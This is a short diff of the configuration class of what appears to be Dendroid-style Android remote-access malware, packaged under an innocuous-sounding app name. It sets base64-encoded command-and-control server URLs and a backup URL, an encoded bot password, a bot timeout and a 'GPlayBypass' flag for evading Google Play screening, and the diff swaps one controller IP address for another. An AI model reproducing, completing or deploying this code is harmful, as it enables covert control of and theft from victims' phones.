@@ -13,13 +13,16 @@ import u.can.i.up.expert.MyService;
 public class DataSet {
 
     private static final DataSet cds = new DataSet();
+    public final String LOG_TAG = "UCanIUp";
     public static DataSet getInstance(){
         return cds;
     }
 
     //********************************************************************************************************************************************************
-    public String encodedURL = "aHR0cDovLzE5Mi4xNjguMi4xMzg="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://pizzachip.com/dendroid)
+    public String encodedURL = "aHR0cDovLzE5Mi4xNjguMi4xMzg="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://192.168.2.138)
     public String backupURL = "aHR0cDovLzE5Mi4xNjguMi4xMzg=";
+//    public String encodedURL = "aHR0cDovLzE5Mi4xNjguMi41OQ=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://192.168.2.59)
+//    public String backupURL = "aHR0cDovLzE5Mi4xNjguMi41OQ==";
     public String encodedPassword = "cGFzc3dvcmQ="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp (ex. keylimepie)
     public int timeout = 10000; //Bot timeout
     public Boolean GPlayBypass = true; //true to bypass OR false to initiate immediately
